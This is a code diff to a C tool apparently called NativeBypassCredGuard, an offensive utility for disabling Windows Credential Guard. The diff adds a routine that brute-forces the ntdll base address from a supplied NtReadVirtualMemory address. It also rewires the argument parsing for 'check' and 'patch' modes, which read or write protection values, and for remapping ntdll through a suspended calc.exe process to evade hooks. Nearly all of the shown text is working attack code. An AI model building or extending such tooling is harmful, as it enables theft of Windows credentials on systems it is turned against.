@@ -868,7 +868,58 @@ void exec(const char* option, bool debug) {
 
 
 void help() {
-    printf("[+] Usage:\n    NativeBypassCredGuard.exe <OPTION> <REMAPNTDLL>\n\n    OPTION:\n        - 'check': Read current values.\n        - 'patch': Write new values.\n\n    REMAPNTDLL:\n        - true: Remap the ntdll library.\n        - false (or omitted): Do not remap the ntdll library.\n\n    Examples:\n        1. NativeBypassCredGuard.exe check\n           - Reads current values without remapping the ntdll library.\n        2. NativeBypassCredGuard.exe patch true\n           - Writes new values and remaps the ntdll library.\n");
+    printf("[+] Usage:\n    NativeBypassCredGuard.exe <NtReadVirtualMemory_Address> <OPTION> <REMAPNTDLL>\n\n    OPTION:\n        - 'check': Read current values.\n        - 'patch': Write new values.\n\n    REMAPNTDLL:\n        - true: Remap the ntdll library.\n        - false (or omitted): Do not remap the ntdll library.\n\n    Examples:\n        1. NativeBypassCredGuard.exe check\n           - Reads current values without remapping the ntdll library.\n        2. NativeBypassCredGuard.exe patch true\n           - Writes new values and remaps the ntdll library.\n");
+}
+
+
+void* get_ntdll_base_address(const char* input) {
+    char full_address_str[32];
+    int len = strlen(input);
+    char prefix[32] = {0};
+    strncpy(prefix, input, len - 6);
+    prefix[len - 6] = '\0';
+
+    char last6[7] = {0};
+    strncpy(last6, input + len - 6, 6);
+
+    unsigned int last6_val = (unsigned int)strtoul(last6, NULL, 16);
+    unsigned int first_nibble = (last6_val >> 20) & 0xF;
+    unsigned int second_nibble = (last6_val >> 16) & 0xF;
+    unsigned int lower_16bits = 0;
+
+    // Combinaciones con segundo nibble variando de 0x0 a 0xF con primer nibble fijo
+    for (unsigned int i = 0; i <= 0xF; i++) {
+        unsigned int new_val = (first_nibble << 20) | (i << 16) | lower_16bits;
+        snprintf(full_address_str, sizeof(full_address_str), "%s%06X", prefix, new_val);
+        // printf("%s\n", full_address_str);
+
+        void* base_address_test = (void*)strtoull(full_address_str, NULL, 16);
+        void* pFunc = CustomGetProcAddress(base_address_test, "NtClose");
+        if (pFunc != NULL) {
+            return base_address_test;
+        }
+    }
+
+    // Now the second batch: first nibble decreased by 1
+    // Combinaciones con segundo nibble variando de 0x0 a 0xF con primer nibble decrecido
+    if (first_nibble > 0) {
+        unsigned int prev_first_nibble = first_nibble - 1;
+
+        for (unsigned int i = 0; i <= 0xF; i++) {
+            unsigned int new_val = (prev_first_nibble << 20) | (i << 16) | lower_16bits;
+            snprintf(full_address_str, sizeof(full_address_str), "%s%06X", prefix, new_val);
+            // printf("%s\n", full_address_str);
+
+            void* base_address_test = (void*)strtoull(full_address_str, NULL, 16);
+            void* pFunc = CustomGetProcAddress(base_address_test, "NtClose");
+
+            if (pFunc != NULL) {
+                return base_address_test;
+            }
+        }
+    }
+
+    return NULL;
 }
 
 
@@ -880,7 +931,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    if (argc < 4) {
+    if (argc < 3) {
         help();
         return 1;
     }
@@ -889,18 +940,19 @@ int main(int argc, char* argv[]) {
         printf("[+] Debug messages:\t\t%s\n", debug ? "true" : "false");
     }
 
-    // First and Second arguments for initializeFunctions
-    uintptr_t initArg1 = (uintptr_t)strtoull(argv[1], NULL, 16);
-    uintptr_t initArg2 = (uintptr_t)strtoull(argv[2], NULL, 16);
+    // First arguments is NtReadVirtualMemory_Address
+    uintptr_t func_address =  (uintptr_t)strtoull(argv[1], NULL, 16);
+    NtReadVirtualMemory = (NtReadVirtualMemoryFn)func_address;
+    uintptr_t hNtdll = (uintptr_t) get_ntdll_base_address(argv[1]);
 
-    // Third argument is the mode (check o patch)
-    char* modeArg = argv[3];
+    // Second argument is the mode (check o patch)
+    char* modeArg = argv[2];
     for (char* p = modeArg; *p; ++p) *p = tolower(*p);
 
-    initializeFunctions(initArg1, initArg2);
+    initializeFunctions(hNtdll, func_address);
 
     if (strcmp(modeArg, "check") == 0 || strcmp(modeArg, "patch") == 0) {
-        if (argc >= 5 && strcmp(argv[4], "true") == 0) {
+        if (argc >= 5 && strcmp(argv[3], "true") == 0) {
             char* process_to_create = (char*)"c:\\Windows\\System32\\calc.exe";
             HANDLE hProcess = CreateSuspProc(process_to_create);
             RemapNtdll(hProcess);
